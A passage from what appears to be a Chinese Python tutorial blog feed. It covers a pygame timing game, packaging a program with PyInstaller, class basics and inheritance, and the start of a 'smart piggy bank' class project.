class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、判断胜负"><a href="#五、判断胜负" class="headerlink" title="五、判断胜负"></a>五、判断胜负</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>          <span class="token comment">#计时的时间（s）</span>start <span class="token operator">=</span> <span class="token boolean">False</span>      <span class="token comment"># 开始计时控制</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>MOUSEBUTTONDOWN<span class="token punctuation">:</span>            <span class="token keyword">if</span> f1rect<span class="token punctuation">.</span>left<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>right <span class="token keyword">and</span> f1rect<span class="token punctuation">.</span>top<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>bottom<span class="token punctuation">:</span>                <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span> <span class="token comment">#如果此时没有开始计时，那么就开始计时</span>                    start <span class="token operator">=</span> <span class="token boolean">True</span>                    count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token comment">#重新开始计时的时候把计时清零</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token comment">#如果已经开始计时了，再按就停止</span>                    start <span class="token operator">=</span> <span class="token boolean">False</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    <span class="token comment">#如果开始计时，那么每隔0.1s，计时+0.1</span>    <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        count <span class="token operator">+=</span> <span class="token number">0.1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment">#判断胜负，如果刚好5s的时候按下停止，游戏成功，否则失败</span>    <span class="token keyword">if</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5.0</span> <span class="token keyword">and</span> start <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>  <span class="token comment">#由于是浮点数，判断时精确到一位小数</span>        f1win<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"恭喜你，游戏成功了！"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>red<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment">#输出提示的字样</span>    <span class="token keyword">if</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">5.0</span> <span class="token keyword">and</span> start <span class="token operator">==</span> <span class="token boolean">False</span> <span class="token keyword">and</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        f1win<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"失败了，请继续努力"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>red<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment">#输出提示的字样</span>    <span class="token comment"># 绘制文字</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    CountRect<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"计时："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、游戏作弊"><a href="#六、游戏作弊" class="headerlink" title="六、游戏作弊"></a>六、游戏作弊</h2><p>思考，如何让玩家一定失败，且不易被察觉。<span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><h2 id="七、打包程序"><a href="#七、打包程序" class="headerlink" title="七、打包程序"></a>七、打包程序</h2><ol><li><p>按win+R打开运行（只针对windows环境）</p></li><li><p>输入cmd打开命令行</p></li><li><p>输入pip install pyinstaller安装PyInstaller 模块（需联外网）</p></li><li><p>输入 Pyinstaller -F 你要打包的程序的绝对路径</p><p>注意中间有空格，-F就是只生产单个文件，别的指令就自己查文档吧</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> Pygame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法4—机房管理系统</title>
      <link href="/2022/02/25/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%954%E2%80%94%E6%9C%BA%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/02/25/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%954%E2%80%94%E6%9C%BA%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="一、类的创建"><a href="#一、类的创建" class="headerlink" title="一、类的创建"></a>一、类的创建</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 类的实例化，小明属于“小孩”类，小明就具备“小孩”类中的属性和方法</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>eatFood<span class="token punctuation">(</span><span class="token string">'包子'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个self是用来做什么的呢？🤦‍♂️</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说话（说出自己的爱好）</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 类的实例化，小明属于“小孩”类，小明就具备“小孩”类中的属性和方法</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>eatFood<span class="token punctuation">(</span><span class="token string">'包子'</span><span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>self是在类还没有创建完成的时候，却又想在类的内容调用类属性或其他方法时<br>就可以用self.属性名或self.方法名调用自身的方法或属性</p><h2 id="二、类的初始化"><a href="#二、类的初始化" class="headerlink" title="二、类的初始化"></a>二、类的初始化</h2><p>初始化方法的作用在于：当每个实例对象创建时，该方法内的代码无须调用就会自动执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 当类实例化的时候自动执行，设置“姓名”属性为小明</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'小明'</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说话（说出自己的爱好）</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，初始化方法的正确用法是在类实例化的时候，我们给一些属性设初值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 当类实例化的时候自动执行，设置“姓名”属性为小明</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说出自己的爱好</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的姓名是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># 实例化对象小明</span>xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 实例化对象小红</span>xiaohong <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token string">'小红'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、类的继承与定制"><a href="#三、类的继承与定制" class="headerlink" title="三、类的继承与定制"></a>三、类的继承与定制</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ball</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    weight <span class="token operator">=</span> <span class="token number">10</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">new_ball</span><span class="token punctuation">(</span>ball<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ball_1 <span class="token operator">=</span> ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_2 <span class="token operator">=</span> new_ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_1<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>ball_2<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这样直接重写父类的方法，如果父类的方法发生变化，子类的方法也得重新修改，不利于我们维护，最好先继承父类的方法，再做修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ball</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    weight <span class="token operator">=</span> <span class="token number">10</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">new_ball</span><span class="token punctuation">(</span>ball<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        ball<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> ball_1 <span class="token operator">=</span> ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_2 <span class="token operator">=</span> new_ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_1<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>ball_2<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目一、智能储蓄罐"><a href="#项目一、智能储蓄罐" class="headerlink" title="项目一、智能储蓄罐"></a>项目一、智能储蓄罐</h1><p>你有一个智能储蓄罐，该储蓄罐安装了高级人工智能芯片，会做四件事。<br>一是可以查询余额 (假设你是一个中东土豪，在对象实例化时，你已经在该储蓄罐已经存了100元)<br>二是可以存钱<br>三是可以取钱<br>四是可以换算美元汇率，1美元=6.3717人民币</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"智能存钱罐"类</span><span class="token keyword">class</span> <span class="token class-name">moneyBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 初始化函数，类实例化的时候自动调用</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>money<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> money    <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用智能存钱罐'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择功能（1、查询余额 2、存钱 3、取钱 4、换算美元 5、退出）：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>saveMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>drawMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>exchangeRate<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'谢谢您的使用，下次记得多来存点钱啊'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token comment"># 展示余额    </span>    <span class="token keyword">def</span> <span class="token function">showMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 存钱</span>    <span class="token keyword">def</span> <span class="token function">saveMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要存多少钱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> self<span class="token punctuation">.</span>money <span class="token operator">+</span> money        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>    <span class="token comment"># 取钱</span>    <span class="token keyword">def</span> <span class="token function">drawMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要取多少钱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>money <span class="token operator">&lt;</span> money<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'抱歉，您太穷了，您没有那么多钱'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> self<span class="token punctuation">.</span>money <span class="token operator">-</span> money        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>    <span class="token comment"># 汇率换算</span>    <span class="token keyword">def</span> <span class="token function">exchangeRate</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        dollar <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>money<span class="token operator">/</span><span class="token number">6.3717</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># round(x,y) 对x的前y位四舍五入取整</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'换算成美元是</span><span class="token interpolation"><span class="token punctuation">{</span>dollar<span class="token punctuation">}</span></span><span class="token 